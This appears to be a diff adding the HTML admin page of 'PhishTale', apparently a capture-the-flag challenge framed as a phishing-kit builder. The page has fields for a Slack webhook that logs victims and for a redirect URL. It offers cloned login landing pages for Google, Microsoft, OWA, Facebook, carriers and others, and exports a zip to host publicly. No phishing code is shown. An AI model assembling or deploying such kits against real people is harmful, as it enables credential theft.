@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>PhishTale Admin</title>
+        <meta name="author" content="rayhan0x01">
+        <link rel="icon" href="/static/images/logo.png" />
+        <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css" />
+        <link rel="stylesheet" type="text/css" href="/static/css/main.css" />
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+          <div class="container-fluid">
+            <div class="navbar-brand"><img src="/static/images/logo.png" class="nav-logo"><span>PhishTale</span>
+            </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
+                  <li class="nav-item">
+                    <a class="nav-link" href="/logout">Logout</a>
+                  </li>
+                </ul>
+              </div>
+          </div>
+        </nav>
+        <div class="container bg-dark mt-5 mb-5 p-3 text-left archiveContainer">
+          <h4 class="p-3 ps-1 pb-0">Download Zip</h4>
+          <span class="text-muted ps-1">Your Phishing kit has been generated successfully, download and host it in a public PHP server.</span><br>
+          <a href="#" id="archive" target="_blank"><button class="btn btn-primary m-3 ms-2">Download Zip</button></a>
+        </div>
+        <div class="container bg-dark mt-5 mb-5 p-3">
+          <h4 class="p-3 ps-1">Configure Campaign</h4>
+          <form method="post" action="/admin/export">
+            <div class="row">
+               <div class="row mt-3">
+                  <div class="form-group col">
+                     <label for="address_1">Slack webhook URL</label>
+                     <input type="text" name="slack-url" class="form-control" value="https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX" placeholder="https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX" /> 
+                  </div>
+               </div>
+               <div class="row">
+                <div class="form-group col">
+                  <label for="address_1">Redirect URL</label>
+                   <input type="text" name="redirect-url" class="form-control" value="https://office.com/" placeholder="https://office.com/" />
+                </div>
+             </div>
+               <div class="row">
+                <div class="form-group col-md-6">
+                   <label for="from_email">Campaign Name</label>
+                   <input type="text" name="campaign" class="form-control" placeholder="Phishtale 0x01 🎣" value="Phishtale 0x01 🎣"/> 
+                </div>
+                <div class="form-group col-md-6">
+                   <label for="phone">Message Title</label>
+                   <input type="text" name="log-title" class="form-control" placeholder="New Phish In The Pond! 🐟" value="New Phish In The Pond! 🐟"/>
+                </div>
+             </div>
+            </div>
+          <h4 class="p-3 ps-1">Select Landing Page</h4>
+          <div class="row mt-3">
+             <div class="col-md-4">
+                  <div class="card mb-3">
+                    <h6 class="card-header">Any Connect</h6>
+                    <img src="/static/phish_templates/anyconnect.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                    <div class="card-body text-center">
+                        <a href="/static/phish_templates/anyconnect/template.php" target="_blank" class="card-link">Preview</a>
+                    </div>
+                    <div class="card-footer text-center">
+                      <input class="form-check-input mb-0" type="radio" name="template-page" value="anyconnect">
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">Facebook</h6>
+                      <img src="/static/phish_templates/facebook.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/facebook/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="facebook">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">Google</h6>
+                      <img src="/static/phish_templates/google.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/google/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="google">
+                      </div>
+                   </div>
+                </div>
+             </div>
+             <div class="row mt-3">
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">LinkedIn</h6>
+                      <img src="/static/phish_templates/linkedin.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/linkedin/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="linkedin">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">OWA 1</h6>
+                      <img src="/static/phish_templates/owagray.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/owagray/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="owagray">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">Twitter</h6>
+                      <img src="/static/phish_templates/twitter.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/twitter/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="twitter">
+                      </div>
+                   </div>
+                </div>
+             </div>
+             <div class="row mt-3">
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">USPS</h6>
+                      <img src="/static/phish_templates/usps.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/usps/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="usps">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">Citrix</h6>
+                      <img src="/static/phish_templates/citrix.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/citrix/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="citrix">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">FedEx</h6>
+                      <img src="/static/phish_templates/fedex.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/fedex/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="fedex">
+                      </div>
+                   </div>
+                </div>
+             </div>
+             <div class="row mt-3">
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">Instagram</h6>
+                      <img src="/static/phish_templates/instagram.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/instagram/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="instagram">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">Microsoft</h6>
+                      <img src="/static/phish_templates/microsoft.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/microsoft/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="microsoft">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">OWA 2</h6>
+                      <img src="/static/phish_templates/owa.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/owa/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="owa">
+                      </div>
+                   </div>
+                </div>
+             </div>
+             <div class="row mt-3">
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">UPS</h6>
+                      <img src="/static/phish_templates/ups.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/ups/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="ups">
+                      </div>
+                   </div>
+                </div>
+                <div class="col-md-4">
+                   <div class="card mb-3">
+                      <h6 class="card-header">WordPress</h6>
+                      <img src="/static/phish_templates/wordpress.png" class="d-block user-select-none temp-img" width="100%"  focusable="false" role="img">
+                      <div class="card-body text-center">
+                         <a href="/static/phish_templates/wordpress/template.php" target="_blank" class="card-link">Preview</a>
+                      </div>
+                      <div class="card-footer text-center">
+                        <input class="form-check-input mb-0" type="radio" name="template-page" value="wordpress">
+                      </div>
+                   </div>
+                </div>
+             </div>
+             <div class="row mt-5 mb-3 justify-content-center">
+              <div class="col-md-3">
+                 <button type="submit" class="btn btn-primary w-100">Export Kit</button>
+              </div>
+           </div>
+          </form>
+          </div>
+       </div>
+       <div class="toast align-items-center" role="alert" aria-live="assertive" aria-atomic="true" id="globalToast">
+        <div class="d-flex">
+          <div class="toast-body" id="globalToastMsg">
+         </div>
+        </div>
+      </div>
+      <script src="/static/js/jquery-3.6.0.min.js"></script>
+      <script src="/static/js/main.js"></script>
+    </body>
+</html>
